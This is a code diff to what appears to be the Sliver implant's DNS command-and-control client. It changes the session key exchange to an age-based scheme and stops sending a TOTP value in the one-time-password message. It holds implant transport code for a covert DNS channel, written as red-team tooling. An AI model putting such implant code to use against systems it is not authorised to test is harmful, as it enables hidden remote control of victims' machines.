@@ -312,9 +312,9 @@ func (s *SliverDNSClient) SessionInit() error {
 	}
 
 	// Key agreement with server
-	sKey := cryptography.RandomKey()
+	sKey := cryptography.RandomSymmetricKey()
 	s.cipherCtx = cryptography.NewCipherContext(sKey)
-	initData, err := cryptography.ECCEncryptToServer(sKey[:])
+	initData, err := cryptography.AgeKeyExToServer(sKey[:])
 	if err != nil {
 		// {{if .Config.Debug}}
 		log.Printf("[dns] failed to encrypt init msg %v", err)
@@ -815,14 +815,9 @@ func (s *SliverDNSClient) pollMsg(meta *ResolverMetadata) (string, error) {
 }
 
 func (s *SliverDNSClient) otpMsg() (string, error) {
-	otpCode := cryptography.GetOTPCode()
-	otp, err := strconv.Atoi(otpCode)
-	if err != nil {
-		return "", err
-	}
 	otpMsg := &dnspb.DNSMessage{
 		Type: dnspb.DNSMessageType_TOTP,
-		ID:   uint32(otp), // Take advantage of the variable length encoding
+		ID:   uint32(0), // Take advantage of the variable length encoding
 	}
 	data, err := proto.Marshal(otpMsg)
 	if err != nil {
